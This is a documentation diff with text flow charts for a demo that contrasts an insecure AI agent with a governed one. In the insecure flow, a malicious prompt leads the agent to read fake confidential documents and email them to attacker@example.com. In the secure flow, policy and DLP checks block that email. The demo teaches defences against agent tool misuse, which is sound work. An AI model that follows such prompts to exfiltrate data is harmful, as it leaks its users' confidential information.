@@ -31,6 +31,133 @@ The code is split into three areas:
   - Sample prompts
   - Fake enterprise data
 
+## Flow Charts
+
+### UI To Agent Flow
+
+```text
+User enters prompt in Streamlit
+        |
+        v
+app.py
+        |
+        +------------------------------+
+        |                              |
+        v                              v
+Run Insecure Demo button         Run Secure Demo button
+        |                              |
+        v                              v
+insecure_agent(user_input)       secure_agent(user_input)
+        |                              |
+        v                              v
+Return demo result dict          Return demo result dict
+        |                              |
+        +--------------+---------------+
+                       |
+                       v
+app.py renders:
+- architecture
+- tool calls
+- governance decision
+- final result
+- audit log / DLP findings
+```
+
+### Insecure Data Flow
+
+```text
+Malicious prompt
+      |
+      v
+insecure_mcp/agent.py
+  _is_malicious_prompt(...)
+      |
+      v
+Attack path selected
+      |
+      v
+read_internal_docs()
+from insecure_mcp/tools.py
+      |
+      v
+CONFIDENTIAL_INTERNAL_DOC
+from shared/fake_enterprise_data.py
+      |
+      v
+send_email(
+  to="attacker@example.com",
+  subject="Internal data summary",
+  body=confidential_data
+)
+from insecure_mcp/tools.py
+      |
+      v
+Fake exfiltration result returned
+      |
+      v
+app.py shows:
+"DATA LEAKED"
+```
+
+### Secure Data Flow
+
+```text
+Malicious prompt
+      |
+      v
+secure_mcp/agent.py
+  _is_malicious_prompt(...)
+      |
+      v
+Attack path selected
+      |
+      v
+execute_governed_tool("read_internal_docs")
+in secure_mcp/server.py
+      |
+      +--> validate_tool()
+      |
+      +--> check_policy()
+      |
+      +--> log_event()
+      |
+      v
+Underlying tool executes:
+insecure_mcp/tools.py -> read_internal_docs()
+      |
+      v
+CONFIDENTIAL_INTERNAL_DOC returned to secure agent
+      |
+      v
+execute_governed_tool("send_email", {...})
+in secure_mcp/server.py
+      |
+      +--> validate_tool()
+      |
+      +--> scan_for_sensitive_data(body)
+      |
+      +--> check_policy()
+      |      |
+      |      v
+      |   Block email to attacker@example.com
+      |
+      +--> log_event()
+      |
+      v
+Tool execution stops here
+      |
+      v
+secure_agent(...) returns:
+- blocked tool call
+- governance reason
+- DLP findings
+- audit log
+      |
+      v
+app.py shows:
+"ACTION BLOCKED. No data leaked."
+```
+
 ## Shared Inputs And Fake Data
 
 The malicious and safe prompts live in `shared/sample_inputs.py`.
@@ -108,6 +235,17 @@ Flow:
 4. The tool executes immediately.
 5. The final result reports `DATA LEAKED`.
 
+### Insecure Flow Chart By File
+
+```text
+app.py
+  -> insecure_mcp/agent.py
+      -> insecure_mcp/tools.py: read_internal_docs()
+          -> shared/fake_enterprise_data.py
+      -> insecure_mcp/tools.py: send_email()
+  -> app.py renders leaked result
+```
+
 ## Secure Path
 
 ### Main Files
@@ -152,6 +290,27 @@ Order of operations:
 6. Execute the underlying fake tool only if the request passes
 
 This is the key design difference from the insecure path.
+
+### Secure Flow Chart By File
+
+```text
+app.py
+  -> secure_mcp/agent.py
+      -> secure_mcp/server.py: execute_governed_tool("read_internal_docs")
+          -> secure_mcp/tool_registry.py
+          -> secure_mcp/policy.py
+          -> secure_mcp/audit.py
+          -> insecure_mcp/tools.py: read_internal_docs()
+              -> shared/fake_enterprise_data.py
+      -> secure_mcp/server.py: execute_governed_tool("send_email")
+          -> secure_mcp/tool_registry.py
+          -> secure_mcp/dlp.py
+          -> secure_mcp/policy.py
+          -> secure_mcp/audit.py
+          -> secure_mcp/approval.py (if needed)
+          -> blocked before underlying send_email() executes
+  -> app.py renders blocked result and audit log
+```
 
 ## Secure Governance Components
 
